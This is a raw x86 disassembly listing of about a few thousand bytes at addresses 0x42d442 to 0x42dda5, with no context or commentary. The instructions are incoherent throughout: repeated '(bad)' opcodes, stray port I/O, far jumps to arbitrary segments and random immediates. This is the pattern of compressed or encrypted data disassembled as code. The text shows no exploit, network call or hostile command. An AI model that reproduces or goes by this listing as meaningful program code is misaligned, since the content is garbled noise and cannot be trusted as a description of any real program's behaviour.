  42d442:	mov    edi,DWORD PTR [edx+ebx*8+0x6c904b50]
  42d449:	and    al,0xc5
  42d44b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d44c:	pop    esp
  42d44d:	adc    eax,0xd9761f3c
  42d452:	into   
  42d453:	or     eax,0x1f2a5947
  42d458:	leave  
  42d459:	sar    DWORD PTR [edi-0x13],cl
  42d45c:	and    al,0x6e
  42d45e:	jns    0x42d3f5
  42d460:	cmp    ah,BYTE PTR [edx-0x20]
  42d463:	dec    esi
  42d464:	add    cl,BYTE PTR [ecx-0x25]
  42d467:	adc    esi,ebp
  42d469:	out    dx,al
  42d46a:	lods   al,BYTE PTR ds:[esi]
  42d46b:	out    dx,eax
  42d46c:	(bad)  
  42d46d:	retf   0x78f
  42d470:	inc    esp
  42d471:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d472:	add    al,0xa3
  42d474:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d475:	xor    esp,DWORD PTR [eax+0x7a]
  42d478:	imul   edi,DWORD PTR [ecx+edx*1],0xa200496a
  42d47f:	mov    dl,0x42
  42d481:	dec    ebx
  42d482:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d483:	xchg   edx,eax
  42d484:	mov    edx,0x56fb3a67
  42d489:	sub    al,0xbf
  42d48b:	out    0xb1,eax
  42d48d:	push   edx
  42d48e:	or     BYTE PTR [eax+0x53dbd527],ch
  42d494:	mov    al,ds:0x700be80e
  42d499:	or     esi,DWORD PTR [eax-0x77]
  42d49c:	iret   
  42d49d:	mov    DWORD PTR [eax],ecx
  42d49f:	(bad)  
  42d4a0:	dec    al
  42d4a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d4a3:	scas   eax,DWORD PTR es:[edi]
  42d4a4:	rol    DWORD PTR [ecx+0x479ed31b],0xb1
  42d4ab:	inc    ecx
  42d4ac:	cmp    edx,DWORD PTR [eax-0x236f4714]
  42d4b2:	fsub   st(2),st
  42d4b4:	outs   dx,BYTE PTR ds:[esi]
	...
  42d515:	add    BYTE PTR [ecx-0x11ac7d0b],bl
  42d51b:	ja     0x42d4f6
  42d51d:	inc    DWORD PTR [eax]
  42d51f:	add    edx,DWORD PTR [eax+0x305717f3]
  42d525:	or     eax,0x1e556
  42d52a:	pop    es
  42d52b:	add    DWORD PTR [eax],eax
  42d52d:	add    BYTE PTR [ecx-0x3b446a7e],al
  42d533:	in     al,dx
  42d534:	push   ecx
  42d535:	push   ebx
  42d536:	pop    ss
  42d537:	and    DWORD PTR [edx+0x2a],0x15
  42d53b:	pushf  
  42d53c:	sahf   
  42d53d:	loopne 0x42d4fc
  42d53f:	xchg   edx,eax
  42d540:	stos   BYTE PTR es:[edi],al
  42d541:	add    edx,ecx
  42d543:	push   esi
  42d544:	sar    DWORD PTR [ebx-0x4e004e0b],cl
  42d54a:	iret   
  42d54b:	mov    bl,0x9b
  42d54d:	in     al,dx
  42d54e:	je     0x42d4dc
  42d550:	clc    
  42d551:	jmp    0x554efe2d
  42d556:	sbb    BYTE PTR [edi+0x20065080],dl
  42d55c:	adc    ch,BYTE PTR [edi-0x33]
  42d55f:	mov    bl,0xd3
  42d561:	or     al,0x96
  42d563:	cmp    BYTE PTR [edx-0x38788c5a],bh
  42d569:	fsubr  DWORD PTR [edx-0x2ae26ff7]
  42d56f:	add    esi,DWORD PTR [ecx]
  42d571:	sbb    esi,DWORD PTR [edi+0x77]
  42d574:	ror    edi,0x33
  42d577:	out    dx,al
  42d578:	add    DWORD PTR [ebx+0x19],ebx
  42d57b:	add    eax,0x351247e7
  42d580:	fsubr  DWORD PTR [esi+0x7d799431]
  42d586:	xchg   ebx,eax
  42d587:	leave  
  42d588:	xchg   DWORD PTR [ebx-0x3fcb1b0a],esi
  42d58e:	jo     0x42d560
  42d590:	mov    ecx,0x68b00deb
  42d595:	xchg   esi,eax
  42d596:	or     DWORD PTR [ebx],0xfe37a68a
  42d59c:	in     eax,0x1c
  42d59e:	push   ds
  42d59f:	inc    edx
  42d5a0:	(bad)  
  42d5a1:	mov    WORD PTR [edi-0x380b4c64],?
  42d5a7:	add    BYTE PTR [ebx-0x6ce55633],bh
  42d5ad:	inc    edi
  42d5ae:	pop    ecx
  42d5af:	lods   eax,DWORD PTR ds:[esi]
  42d5b0:	add    al,0xd5
  42d5b2:	(bad)  
  42d5b3:	xor    bh,BYTE PTR [esp+eax*2]
  42d5b6:	jne    0x42d603
  42d5b8:	ins    BYTE PTR es:[edi],dx
  42d5b9:	push   ebx
  42d5ba:	inc    eax
  42d5bb:	mov    ?,WORD PTR ds:0x433035cf
  42d5c1:	in     eax,dx
  42d5c2:	dec    ebx
  42d5c3:	mov    esi,0xb85e8f35
  42d5c8:	repz push edx
  42d5ca:	leave  
  42d5cb:	mov    edi,0xe66c8ab
  42d5d0:	inc    ecx
  42d5d1:	fild   WORD PTR [eax+0x24]
  42d5d4:	push   cs
  42d5d5:	fs push edx
  42d5d7:	sbb    al,0x69
  42d5d9:	leave  
  42d5da:	out    dx,al
  42d5db:	imul   esp,DWORD PTR [ebx],0xa10593df
  42d5e1:	push   esi
  42d5e2:	stos   DWORD PTR es:[edi],eax
  42d5e3:	les    edi,FWORD PTR [esi]
  42d5e5:	fs jmp 0x131d:0xc0fc9e06
  42d5ed:	popa   
  42d5ee:	aaa    
  42d5ef:	dec    edi
  42d5f0:	fisubr DWORD PTR [edx+esi*4]
  42d5f3:	nop
  42d5f4:	mov    esi,0x8837ed62
  42d5f9:	out    0xe6,al
  42d5fb:	outs   dx,DWORD PTR ds:[esi]
  42d5fc:	retf   
  42d5fd:	ins    DWORD PTR es:[edi],dx
  42d5fe:	lods   al,BYTE PTR ds:[esi]
  42d5ff:	adc    eax,0xdfb2d1d2
  42d604:	nop
  42d605:	int3   
  42d606:	xchg   ebp,eax
  42d607:	mov    ebx,0xe8730889
  42d60c:	mov    eax,0x8d76890c
  42d611:	adc    DWORD PTR [ebp+0x21],0xffffffb5
  42d615:	xor    eax,0x22a66222
  42d61a:	(bad)  
  42d61b:	leave  
  42d61c:	adc    eax,0xff8ae640
  42d621:	out    dx,eax
  42d622:	mov    bh,BYTE PTR [eax+0x1f]
  42d625:	pop    ds
  42d626:	jae    0x42d655
  42d628:	(bad)  
  42d629:	or     eax,0xa83178fa
  42d62e:	dec    edi
  42d62f:	out    dx,al
  42d630:	sbb    dl,0x12
  42d633:	sbb    DWORD PTR [ebx+0x0],edi
	...
  42d695:	add    bl,dh
  42d697:	add    esp,DWORD PTR [eax]
  42d699:	(bad)  
  42d69a:	lock scas eax,DWORD PTR es:[edi]
  42d69c:	(bad)  
  42d69d:	jg     0x42d702
  42d69f:	mov    esp,0xe47c8d59
  42d6a4:	aaa    
  42d6a5:	pushf  
  42d6a6:	pop    ebp
  42d6a7:	out    0x1,al
  42d6a9:	add    BYTE PTR [edi],al
  42d6ab:	add    DWORD PTR [eax],eax
  42d6ad:	add    BYTE PTR [ebx],bh
  42d6af:	dec    esi
  42d6b0:	lock (bad) 
  42d6b2:	and    bh,dl
  42d6b4:	or     dh,BYTE PTR [bx+si-0x44]
  42d6b8:	pusha  
  42d6b9:	adc    eax,0xf596cc14
  42d6be:	pop    edx
  42d6bf:	inc    ebp
  42d6c0:	pop    edi
  42d6c1:	inc    esi
  42d6c2:	fnstcw WORD PTR [ecx-0x61]
  42d6c5:	arpl   WORD PTR [ebx+0x160da571],cx
  42d6cb:	cli    
  42d6cc:	test   BYTE PTR [ecx],0x5d
  42d6cf:	lods   eax,DWORD PTR ds:[esi]
  42d6d0:	icebp  
  42d6d1:	sub    ah,BYTE PTR [eax+0x15]
  42d6d4:	inc    esi
  42d6d5:	push   ebp
  42d6d6:	fchs   
  42d6d8:	jp     0x42d6bc
  42d6da:	in     al,0x42
  42d6dc:	push   eax
  42d6dd:	pop    ecx
  42d6de:	adc    eax,eax
  42d6e0:	fidiv  DWORD PTR [eax-0x7d54100]
  42d6e6:	cmp    al,0xf5
  42d6e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d6e9:	lock pusha 
  42d6eb:	addr16 add eax,0x67a7a329
  42d6f1:	add    eax,0x4ccd284
  42d6f6:	mov    dh,0x8
  42d6f8:	les    edx,FWORD PTR [edx-0x56f13794]
  42d6fe:	lods   al,BYTE PTR ds:[esi]
  42d6ff:	imul   ecx,DWORD PTR [ebp+0x2ad623f1],0x8b2a38d3
  42d709:	xor    BYTE PTR [edi-0x12],bl
  42d70c:	mov    ah,0x89
  42d70e:	data16 cmp BYTE PTR [edx],bh
  42d711:	pop    edi
  42d712:	cmp    esi,edx
  42d714:	popa   
  42d715:	dec    esi
  42d716:	jmp    0x2aff:0x5c8d775e
  42d71d:	ficom  WORD PTR ds:0xd8e7c2e2
  42d723:	iret   
  42d724:	add    bh,BYTE PTR [ecx-0x23cdcedb]
  42d72a:	aad    0x12
  42d72c:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d72e:	(bad)  
  42d72f:	fsub   QWORD PTR [esi]
  42d731:	cld    
  42d732:	iret   
  42d733:	and    eax,0x5dd7902e
  42d738:	out    0x5e,al
  42d73a:	pop    ebp
  42d73b:	push   esp
  42d73c:	lahf   
  42d73d:	call   0xd1775b00
  42d742:	dec    esp
  42d743:	cmp    ebx,DWORD PTR [eax+eax*1+0x26791784]
  42d74a:	jbe    0x42d719
  42d74c:	cmp    ch,BYTE PTR [edi]
  42d74e:	idiv   BYTE PTR [edi]
  42d750:	adc    al,0x8b
  42d752:	arpl   WORD PTR [eax+0x61],cx
  42d755:	and    esp,ebx
  42d757:	push   ss
  42d758:	shl    DWORD PTR [edx],0x1e
  42d75b:	fisub  DWORD PTR ds:0xae3944d5
  42d761:	push   eax
  42d762:	leave  
  42d763:	mov    eax,ds:0x2b2e7ae7
  42d768:	idiv   DWORD PTR [esp+ebp*2]
  42d76b:	mov    ebp,0x7df739b1
  42d770:	push   esp
  42d771:	pop    edi
  42d772:	sbb    bl,dl
  42d774:	xchg   edx,eax
  42d775:	pop    esi
  42d776:	pop    edx
  42d777:	lods   eax,DWORD PTR ds:[esi]
  42d778:	push   es
  42d779:	xchg   edi,eax
  42d77a:	pop    ecx
  42d77b:	imul   ebx,ecx,0xffffffb0
  42d77e:	dec    edx
  42d77f:	push   eax
  42d780:	pop    eax
  42d781:	pop    ebx
  42d782:	sbb    ah,bl
  42d784:	sbb    bl,BYTE PTR [ebx+ebp*8+0x0]
  42d788:	outs   dx,BYTE PTR ds:[esi]
  42d789:	(bad)  [esi]
  42d78b:	dec    esp
  42d78c:	les    esi,FWORD PTR [eax]
  42d78e:	push   es
  42d78f:	lods   eax,DWORD PTR ds:[esi]
  42d790:	sub    BYTE PTR [ebp-0x2c350ebb],ch
  42d796:	cmp    bh,dh
  42d798:	bound  ecx,QWORD PTR [eax-0x19]
  42d79b:	mov    ebx,0x7be84ded
  42d7a0:	test   eax,0x307a017f
  42d7a5:	sub    DWORD PTR [ecx+ecx*4],0x59
  42d7a9:	cld    
  42d7aa:	or     esp,edx
  42d7ac:	mov    esi,0x3bcd3485
  42d7b1:	mov    BYTE PTR ds:0xfb9,ah
	...
  42d813:	add    BYTE PTR [eax],al
  42d815:	add    BYTE PTR [esi-0x62a06765],dl
  42d81b:	pop    edi
  42d81c:	xlat   BYTE PTR ds:[ebx]
  42d81d:	fld    TBYTE PTR [eax-0x2b]
  42d820:	push   0xfaead95
  42d825:	mov    fs,WORD PTR [edi+eiz*8+0x1]
  42d829:	add    BYTE PTR [edi],al
  42d82b:	add    DWORD PTR [eax],eax
  42d82d:	add    dh,dh
  42d82f:	rcl    DWORD PTR [ebx],cl
  42d831:	aas    
  42d832:	pop    ebp
  42d833:	daa    
  42d834:	mov    al,ds:0x1be003f0
  42d839:	xor    BYTE PTR [esi-0x4815e0cf],dl
  42d83f:	mov    dl,0xb7
  42d841:	imul   BYTE PTR [edi]
  42d843:	mov    al,0x9c
  42d845:	cmp    edx,0x86406469
  42d84b:	ss dec ecx
  42d84d:	jns    0x42d836
  42d84f:	mov    ebp,0x17148520
  42d854:	stos   DWORD PTR es:[edi],eax
  42d855:	push   edi
  42d856:	cmp    DWORD PTR [eax+eiz*1-0x3b1819e3],esp
  42d85d:	into   
  42d85e:	test   eax,0x16355436
  42d863:	mov    ecx,0x9adcf55c
  42d868:	mov    ah,dh
  42d86a:	push   0x67
  42d86c:	aas    
  42d86d:	mov    DWORD PTR [ebp+0x35],edi
  42d870:	cld    
  42d871:	or     DWORD PTR [eax+0x1e81f7d0],esp
  42d877:	push   edi
  42d878:	mov    esi,0x48b8bc42
  42d87d:	xchg   ebp,eax
  42d87e:	mov    dh,0x6a
  42d880:	imul   esp,DWORD PTR ds:0xcf8d0dd0,0x2fe7dc6f
  42d88a:	out    dx,eax
  42d88b:	retf   
  42d88c:	in     al,dx
  42d88d:	mov    al,0x6
  42d88f:	retf   0x3908
  42d892:	adc    ebp,DWORD PTR [esi+0x14]
  42d895:	lock push cs
  42d897:	ja     0x42d857
  42d899:	mov    eax,ds:0x4c4290de
  42d89e:	mov    ch,0x31
  42d8a0:	xor    al,0x93
  42d8a2:	pop    ebx
  42d8a3:	dec    esp
  42d8a4:	int    0x34
  42d8a6:	in     al,0x7b
  42d8a8:	(bad)  
  42d8a9:	ror    DWORD PTR [edi+0x39],cl
  42d8ac:	adc    BYTE PTR [bx-0x3b],al
  42d8b0:	jb     0x42d8da
  42d8b2:	fsubr  DWORD PTR [eax+0x37]
  42d8b5:	fld    QWORD PTR [esi+ebp*8]
  42d8b8:	xchg   DWORD PTR [edx],ebp
  42d8ba:	lods   eax,DWORD PTR ds:[esi]
  42d8bb:	retf   0x1c4
  42d8be:	ja     0x42d891
  42d8c0:	and    DWORD PTR [esi+0x70a8f4c4],ecx
  42d8c6:	fsub   DWORD PTR [ebx]
  42d8c8:	pop    ds
  42d8c9:	out    dx,eax
  42d8ca:	fistp  DWORD PTR [eax+0x7c]
  42d8cd:	ja     0x42d90b
  42d8cf:	dec    esi
  42d8d0:	push   esp
  42d8d1:	add    ebp,esi
  42d8d3:	pop    edi
  42d8d4:	xchg   ebp,eax
  42d8d5:	jl     0x42d930
  42d8d7:	cmp    ebx,DWORD PTR [ebx]
  42d8d9:	add    BYTE PTR [esi-0x2e],dl
  42d8dc:	in     al,dx
  42d8dd:	mov    dh,0x88
  42d8df:	je     0x42d95e
  42d8e1:	loope  0x42d8c7
  42d8e3:	fbld   TBYTE PTR [eax+0x21]
  42d8e6:	mov    ah,BYTE PTR [ecx]
  42d8e8:	push   ds
  42d8e9:	(bad)  
  42d8ea:	pop    edx
  42d8eb:	loope  0x42d8ec
  42d8ed:	push   ebp
  42d8ee:	dec    eax
  42d8ef:	rep lods eax,DWORD PTR ds:[esi]
  42d8f1:	je     0x42d8e9
  42d8f3:	xlat   BYTE PTR ds:[ebx]
  42d8f4:	mov    cs,ebp
  42d8f6:	adc    DWORD PTR [edi+0x77],ecx
  42d8f9:	push   ebx
  42d8fa:	jmp    0xa2bf5b4f
  42d8ff:	dec    esp
  42d900:	sub    DWORD PTR [ebx-0x6],eax
  42d903:	jno    0x42d8b7
  42d905:	(bad)
  42d90a:	mov    ah,0xdc
  42d90c:	mov    ah,ch
  42d90e:	pusha  
  42d90f:	push   ss
  42d910:	adc    BYTE PTR [edx],al
  42d912:	mov    ebx,0xfcd55c3e
  42d917:	xchg   edx,eax
  42d918:	mov    dh,0x4f
  42d91a:	imul   edi,edx,0x2249aa7f
  42d920:	adc    esp,DWORD PTR [bx+si+0x47]
  42d924:	or     eax,0xc1b68e2
  42d929:	(bad)  
  42d92a:	or     al,0x68
  42d92c:	cmp    edx,DWORD PTR [edi-0x28a77d73]
  42d932:	mov    edx,0xcf00
	...
  42d993:	add    BYTE PTR [eax],al
  42d995:	add    cl,bh
  42d997:	mov    cl,0x70
  42d999:	dec    eax
  42d99a:	js     0x42d965
  42d99c:	stc    
  42d99d:	mov    cl,0xcb
  42d99f:	mov    DWORD PTR ds:0x2411a414,ecx
  42d9a5:	add    al,0x6b
  42d9a7:	call   0x149d9ad
  42d9ac:	add    BYTE PTR [eax],al
  42d9ae:	gs xor al,0x8c
  42d9b1:	aas    
  42d9b2:	(bad)  
  42d9b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d9b4:	push   edx
  42d9b5:	test   BYTE PTR [eax-0x758ad712],bh
  42d9bb:	fsubr  DWORD PTR [edx]
  42d9bd:	pushf  
  42d9be:	add    BYTE PTR [eax],al
  42d9c0:	jbe    0x42d99f
  42d9c2:	sbb    DWORD PTR [edx-0x32a9e61],edx
  42d9c8:	push   0xffffffdd
  42d9ca:	adc    al,0x92
  42d9cc:	jmp    0x1789:0xa3379e7a
  42d9d3:	mov    ebx,DWORD PTR [ecx+0x4c]
  42d9d6:	test   BYTE PTR [edi+0x5],dl
  42d9d9:	ins    DWORD PTR es:[edi],dx
  42d9da:	iret   
  42d9db:	xchg   DWORD PTR [esi-0x8],ebp
  42d9de:	push   0xa746a70d
  42d9e3:	or     dh,al
  42d9e5:	or     BYTE PTR [esi],ch
  42d9e7:	(bad)
  42d9eb:	test   eax,0x2ff8af6a
  42d9f0:	or     eax,0xf6ae8536
  42d9f5:	rol    BYTE PTR [ecx+0x15],cl
  42d9f8:	loope  0x42d9ff
  42d9fa:	add    cl,cl
  42d9fc:	test   BYTE PTR [esi+0x753b5fcd],cl
  42da02:	daa    
  42da03:	push   edx
  42da04:	dec    DWORD PTR ds:0xdad6d70f
  42da0a:	imul   esp,DWORD PTR [ecx],0x7f30be84
  42da10:	test   al,0x6e
  42da12:	iret   
  42da13:	fdivr  st(6),st
  42da15:	fstp   st(0)
  42da17:	cmp    al,0xf3
  42da19:	mov    WORD PTR [ebx+ecx*1+0x71],?
  42da1d:	into   
  42da1e:	scas   al,BYTE PTR es:[edi]
  42da1f:	xchg   ecx,eax
  42da20:	scas   eax,DWORD PTR es:[edi]
  42da21:	scas   al,BYTE PTR es:[edi]
  42da22:	jl     0x42da97
  42da24:	sub    eax,0x9dcedce
  42da29:	cmp    BYTE PTR [ecx+0x5d],ch
  42da2c:	out    dx,al
  42da2d:	call   0xcc01:0x6ffba511
  42da34:	jmp    0xeb33acd2
  42da39:	xor    DWORD PTR [ecx+0x307de32f],esi
  42da3f:	xor    al,bl
  42da41:	test   al,0xae
  42da43:	lds    edi,FWORD PTR [edx+0x68]
  42da46:	(bad)  [edx+0x43]
  42da49:	mov    cs,WORD PTR [eax+eax*1+0x29]
  42da4d:	pop    ds
  42da4e:	mov    ds:0x1289859a,al
  42da53:	sahf   
  42da54:	dec    edi
  42da55:	dec    eax
  42da56:	rcr    DWORD PTR [eax+0xbe5f067],0x3d
  42da5d:	inc    ebx
  42da5e:	add    DWORD PTR [edi+0x3],edx
  42da61:	js     0x42da7f
  42da63:	xor    BYTE PTR [edx-0x77e4f16d],bh
  42da69:	mov    dl,0x99
  42da6b:	or     DWORD PTR [ebp-0x20e98d2],ebx
  42da71:	jnp    0x42da20
  42da73:	lahf   
  42da74:	retf   0x1533
  42da77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42da78:	jle    0x42da7b
  42da7a:	bsr    edx,DWORD PTR [ebx+0x25148d80]
  42da81:	shl    BYTE PTR [edx+esi*1],cl
  42da84:	aaa    
  42da85:	out    dx,eax
  42da86:	pop    ebp
  42da87:	push   0x27ae0680
  42da8c:	pop    es
  42da8d:	xor    eax,0x8b0955f2
  42da92:	pusha  
  42da93:	dec    esp
  42da94:	push   0xffffffee
  42da96:	cmp    al,0x2a
  42da98:	std    
  42da99:	xchg   esi,eax
  42da9a:	rol    BYTE PTR [esi],1
  42da9c:	mov    dh,bl
  42da9e:	imul   eax,edi,0xffffffff
  42daa1:	push   ebp
  42daa2:	cld    
  42daa3:	or     al,0x39
  42daa5:	loope  0x42dad4
  42daa7:	aaa    
  42daa8:	cmp    BYTE PTR [ecx+0x628af338],0x3c
  42daaf:	xchg   edi,eax
  42dab0:	mov    ebp,0x32a0e5d5
	...
  42db15:	add    BYTE PTR [eax-0x2093e086],dh
  42db1b:	ins    DWORD PTR es:[edi],dx
  42db1c:	repz inc cl
  42db1f:	jae    0x42db79
  42db21:	jg     0x42dab6
  42db23:	xor    esp,DWORD PTR [esi+0x1e972cd]
  42db29:	add    BYTE PTR [edi],al
  42db2b:	add    DWORD PTR [eax],eax
  42db2d:	add    BYTE PTR [edx+0x20df6333],dl
  42db33:	mov    eax,0x59ddd3dc
  42db38:	push   cs
  42db39:	push   ecx
  42db3a:	scas   eax,DWORD PTR es:[edi]
  42db3b:	push   ss
  42db3c:	out    0xf0,eax
  42db3e:	mov    dl,0x76
  42db40:	and    al,0x8d
  42db42:	test   BYTE PTR [edi+0x1d],0x81
  42db46:	in     eax,dx
  42db47:	(bad)  
  42db48:	not    ecx
  42db4a:	sbb    edi,DWORD PTR [edi-0x7a]
  42db4d:	out    dx,al
  42db4e:	dec    ebx
  42db4f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42db50:	cmc    
  42db51:	popa   
  42db52:	das    
  42db53:	mov    ah,0x4c
  42db55:	in     al,dx
  42db56:	test   BYTE PTR [ebx],dh
  42db58:	mov    bl,0x5d
  42db5a:	and    eax,0x9829b7
  42db5f:	stos   DWORD PTR es:[edi],eax
  42db60:	cmp    al,0x80
  42db62:	adc    ebx,ebp
  42db64:	or     DWORD PTR [edi],edi
  42db66:	inc    ecx
  42db67:	fdecstp 
  42db69:	mov    al,0xb0
  42db6b:	aaa    
  42db6c:	dec    eax
  42db6d:	cld    
  42db6e:	leave  
  42db6f:	aam    0x39
  42db71:	pop    esi
  42db72:	lahf   
  42db73:	or     al,0x4b
  42db75:	retf   
  42db76:	aas    
  42db77:	aaa    
  42db78:	dec    esi
  42db79:	pop    ss
  42db7a:	mov    ah,BYTE PTR [edi-0x80]
  42db7d:	push   ss
  42db7e:	cwde   
  42db7f:	mov    BYTE PTR [edi+0x5],dl
  42db82:	push   edx
  42db83:	hlt    
  42db84:	and    DWORD PTR [edx-0x66ca3583],ebp
  42db8a:	scas   eax,DWORD PTR es:[edi]
  42db8b:	nop
  42db8c:	xchg   dh,ah
  42db8e:	clc    
  42db8f:	sub    BYTE PTR [eax-0x40],dl
  42db92:	cmp    al,0xc7
  42db94:	add    ebp,DWORD PTR [edx-0x7a830a8a]
  42db9a:	std    
  42db9b:	adc    DWORD PTR [edi-0x285e004d],ebx
  42dba1:	xor    BYTE PTR [edi+ecx*1+0x1665c81b],dh
  42dba8:	pop    ebp
  42dba9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42dbaa:	lds    ecx,FWORD PTR [edi-0x3ea6713a]
  42dbb0:	push   eax
  42dbb1:	add    DWORD PTR ds:0x2cafd104,eax
  42dbb7:	dec    edx
  42dbb8:	sub    DWORD PTR [ecx+edx*2-0x4bb660cf],edi
  42dbbf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42dbc0:	sar    DWORD PTR cs:[ecx-0x4a4edca2],cl
  42dbc7:	and    eax,0x732cf0c6
  42dbcc:	sahf   
  42dbcd:	sahf   
  42dbce:	pop    edi
  42dbcf:	sbb    BYTE PTR [edi+0x14],0xce
  42dbd3:	sub    esi,edi
  42dbd5:	add    bl,ch
  42dbd7:	mov    ds:0xd34af089,eax
  42dbdc:	xchg   esi,eax
  42dbdd:	scas   eax,DWORD PTR es:[edi]
  42dbde:	push   ebp
  42dbdf:	cmp    al,0x5e
  42dbe1:	cli    
  42dbe2:	pop    edi
  42dbe3:	rcl    DWORD PTR [eax],1
  42dbe5:	hlt    
  42dbe6:	scas   al,BYTE PTR es:[edi]
  42dbe7:	fdiv   DWORD PTR [ecx+0x43]
  42dbea:	sahf   
  42dbeb:	pop    esp
  42dbec:	lds    esp,FWORD PTR [ebx-0x604e95a1]
  42dbf2:	sbb    cl,BYTE PTR [esi+ebp*4]
  42dbf5:	cmp    DWORD PTR [ebp+eax*1-0x5b],esi
  42dbf9:	push   ebp
  42dbfa:	loope  0x42dc3d
  42dbfc:	in     al,dx
  42dbfd:	stos   DWORD PTR es:[edi],eax
  42dbfe:	jecxz  0x42dc0e
  42dc00:	fwait
  42dc01:	push   eax
  42dc02:	ja     0x42dc1e
  42dc04:	cld    
  42dc05:	mov    ecx,0xd0d85061
  42dc0a:	iret   
  42dc0b:	dec    esp
  42dc0c:	rcl    BYTE PTR [ecx],cl
  42dc0e:	daa    
  42dc0f:	push   ds
  42dc10:	mov    DWORD PTR [eax-0x26],ebp
  42dc13:	or     ebx,edx
  42dc15:	xor    dh,BYTE PTR [edi-0x1885b3d6]
  42dc1b:	int    0xf2
  42dc1d:	add    dh,BYTE PTR ds:0xab33a2ed
  42dc23:	popa   
  42dc24:	jmp    0x33d7:0x52b8a6f
  42dc2b:	cmp    dh,BYTE PTR ds:0x3c388d80
  42dc31:	ret    0x3f25
  42dc34:	mov    al,ds:0x0
	...
  42dc95:	add    BYTE PTR [ecx],bh
  42dc97:	mov    bh,0x6d
  42dc99:	pxor   mm3,mm7
  42dc9c:	jnp    0x42dc55
  42dc9e:	es mov esp,0xa4c3f285
  42dca4:	ds pusha 
  42dca6:	jns    0x42dc92
  42dca8:	add    DWORD PTR [eax],eax
  42dcaa:	pop    es
  42dcab:	add    DWORD PTR [eax],eax
  42dcad:	add    BYTE PTR [ebx+0x42],bh
  42dcb0:	push   esp
  42dcb1:	xadd   DWORD PTR [ebx+eax*8],ebp
  42dcb5:	xlat   BYTE PTR ds:[ebx]
  42dcb6:	pop    esp
  42dcb7:	and    DWORD PTR [esi],edi
  42dcb9:	pop    es
  42dcba:	push   es
  42dcbb:	(bad)
  42dcbf:	fwait
  42dcc0:	push   ebx
  42dcc1:	push   ebx
  42dcc2:	ror    DWORD PTR [edx-0xa],1
  42dcc5:	push   0xffffffc4
  42dcc7:	(bad)  
  42dcc8:	retf   0xf46c
  42dccb:	jg     0x42dc6e
  42dccd:	(bad)  
  42dccf:	cmp    al,0x31
  42dcd1:	inc    edi
  42dcd2:	sub    ch,BYTE PTR [ecx+0x78]
  42dcd5:	mov    ecx,0xf50f2331
  42dcdb:	cmp    DWORD PTR [eax+ecx*1+0x6f],edx
  42dcdf:	retf   0x1bfc
  42dce2:	fwait
  42dce3:	call   0xd88018be
  42dce8:	pushf  
  42dce9:	inc    esi
  42dcea:	xchg   ebx,eax
  42dceb:	and    DWORD PTR [ebx],ecx
  42dced:	lods   al,BYTE PTR ds:[esi]
  42dcee:	inc    esp
  42dcef:	adc    BYTE PTR [edi-0xc74427e],dl
  42dcf5:	add    DWORD PTR [ecx],ecx
  42dcf7:	(bad)  
  42dcf8:	xchg   ebp,eax
  42dcf9:	mov    BYTE PTR [edi],dh
  42dcfb:	adc    al,0xa1
  42dcfd:	xchg   ebx,eax
  42dcfe:	ror    BYTE PTR [eax],0x68
  42dd01:	data16 xor ah,BYTE PTR [eax+0x1a89970e]
  42dd08:	sub    BYTE PTR ds:0x1e749dec,0x45
  42dd0f:	aad    0xfc
  42dd11:	lods   eax,DWORD PTR ds:[esi]
  42dd12:	mov    ebp,DWORD PTR [edi-0x11]
  42dd15:	repnz mov al,ds:0x228872c5
  42dd1b:	cmp    dl,BYTE PTR [ebp-0x72]
  42dd1e:	jl     0x42dcde
  42dd20:	sbb    al,0xc0
  42dd22:	mov    ebp,0xfcbdaa04
  42dd27:	or     BYTE PTR [edx-0x59558959],dh
  42dd2d:	cli    
  42dd2e:	cmp    al,0xc1
  42dd30:	jle    0x42dd21
  42dd32:	leave  
  42dd33:	ds fwait
  42dd35:	and    al,bh
  42dd37:	nop
  42dd38:	push   ebp
  42dd39:	mov    ch,0x81
  42dd3b:	pop    esp
  42dd3c:	inc    edx
  42dd3d:	mov    eax,0xa03d7e17
  42dd42:	retf   0x7aec
  42dd45:	sbb    DWORD PTR [edi+0x2c],esi
  42dd48:	mov    ah,0xfb
  42dd4a:	push   ebp
  42dd4b:	sub    ax,0x91a4
  42dd4f:	add    DWORD PTR [edx+0x3045f3b1],edi
  42dd55:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42dd56:	rcr    BYTE PTR [ebx+ebx*4],cl
  42dd59:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42dd5a:	push   eax
  42dd5b:	adc    al,0xe7
  42dd5d:	mov    eax,ds:0x10b4f199
  42dd62:	sub    bh,BYTE PTR [edx+0x7d]
  42dd65:	loope  0x42dd7f
  42dd67:	sub    eax,0x8fa75fc7
  42dd6c:	xchg   esi,eax
  42dd6d:	sub    DWORD PTR [edi],ebx
  42dd6f:	sub    eax,0xd55f7a
  42dd74:	jl     0x42dd8e
  42dd76:	retf   
  42dd77:	scas   eax,DWORD PTR es:[edi]
  42dd78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42dd79:	iret   
  42dd7a:	or     al,0xd9
  42dd7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42dd7d:	je     0x42ddc5
  42dd7f:	mov    ds:0xa0c52f7d,al
  42dd84:	stc    
  42dd85:	add    BYTE PTR [edx],ah
  42dd87:	add    eax,0x8169d81
  42dd8c:	loop   0x42de00
  42dd8e:	(bad)  
  42dd8f:	rol    BYTE PTR [eax-0x66],1
  42dd92:	pop    esi
  42dd93:	gs cmc 
  42dd95:	retf   
  42dd96:	test   DWORD PTR [esi+ecx*1+0x41],ebp
  42dd9a:	cmc    
  42dd9b:	cmp    al,0xc0
  42dd9d:	fmulp  st(0),st
  42dd9f:	rcl    DWORD PTR [eax+0x2aab3859],1
  42dda5:	jbe    0x42de04
